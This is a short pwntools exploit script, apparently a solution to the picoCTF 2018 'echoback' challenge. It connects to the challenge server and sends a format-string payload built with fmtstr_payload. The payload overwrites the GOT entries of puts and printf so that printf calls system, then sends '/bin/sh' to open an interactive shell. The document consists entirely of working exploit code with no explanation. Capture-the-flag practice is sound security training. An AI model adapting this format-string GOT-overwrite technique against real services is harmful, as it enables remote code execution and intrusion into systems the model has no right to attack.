#!/usr/bin/python                                                                                
from pwn import *

#p = process("./echoback")
p = remote("2018shell3.picoctf.com", 26532)
elf = ELF("./echoback")
printf_got = elf.got['printf']
system_plt = elf.plt['system']
vuln = 0x8048643
puts_got = elf.got['puts']

pay = fmtstr_payload(7, {puts_got: vuln, printf_got: system_plt})
p.sendline(pay)

p.sendline("/bin/sh\x00")

p.interactive()
